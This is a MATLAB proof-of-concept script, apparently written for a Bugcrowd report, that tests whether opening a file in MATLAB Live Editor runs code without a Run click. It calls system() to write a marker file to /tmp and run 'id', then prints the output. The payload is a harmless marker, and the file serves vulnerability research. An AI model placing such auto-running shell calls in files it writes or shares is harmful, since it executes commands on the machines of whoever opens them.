%% Bugcrowd PoC — opengit auto-run test
% Tests whether MATLAB Live Editor / open-with-focus triggers code execution
% without explicit Run click.
mark = sprintf('AUTO_M_%s', datestr(now,'yyyymmddTHHMMSS'));
disp(['[POC-AUTO-M] ', mark]);
[~,o] = system('echo POC_RAN_AT_$(date -u +%s) > /tmp/poc_auto_m.marker; id');
disp(['[POC-AUTO-M-OUT] ', strtrim(o)]);
